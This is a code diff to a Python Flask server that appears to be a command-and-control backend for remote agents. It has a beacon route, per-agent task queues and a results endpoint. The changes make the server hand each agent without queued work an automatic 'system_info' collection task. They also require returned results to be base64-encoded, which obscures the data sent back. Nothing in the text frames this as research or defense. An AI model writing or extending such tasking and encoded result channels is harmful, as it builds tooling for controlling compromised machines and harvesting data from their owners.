@@ -186,7 +186,11 @@ def agent_beacon():
 
 @app.route('/api/tasks/<agent_id>', methods=['GET'])
 def get_tasks(agent_id):
-    return jsonify(tasks.get(agent_id, []))
+    task_list = tasks.get(agent_id, [])
+    if not task_list:
+        # Return one-time snapshot task
+        return jsonify([{'id': f'task_info_{datetime.now().timestamp()}', 'type': 'system_info', 'data': {}, 'status': 'pending', 'timestamp': datetime.now().isoformat()}])
+    return jsonify(task_list)
 
 @app.route('/api/tasks', methods=['POST'])
 def create_task():
@@ -265,19 +269,30 @@ def get_result(task_id):
 
 @app.route('/api/results', methods=['POST'])
 def submit_result():
-    data = request.get_json()
-    task_id = data.get('task_id')
-    agent_id = data.get('agent_id')
-    result = data.get('result')
+    try:
+        wrapper = request.get_json()
+        encoded_data = wrapper.get('data')
+        if not encoded_data:
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
 
-    if task_id and result:
-        results[task_id] = {
-            'agent_id': agent_id,
-            'result': result,
-            'timestamp': datetime.now().isoformat()
-        }
-        return jsonify({'status': 'success'})
-    return jsonify({'status': 'error'}), 400
+        decoded_json = base64.b64decode(encoded_data).decode()
+        data = json.loads(decoded_json)
+
+        task_id = data.get('task_id')
+        agent_id = data.get('agent_id')
+        result = data.get('result')
+
+        if task_id and result:
+            results[task_id] = {
+                'agent_id': agent_id,
+                'result': result,
+                'timestamp': datetime.now().isoformat()
+            }
+            return jsonify({'status': 'success'})
+        return jsonify({'status': 'error'}), 400
+    except Exception as e:
+        logging.error(f"Result submission error: {str(e)}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5001)
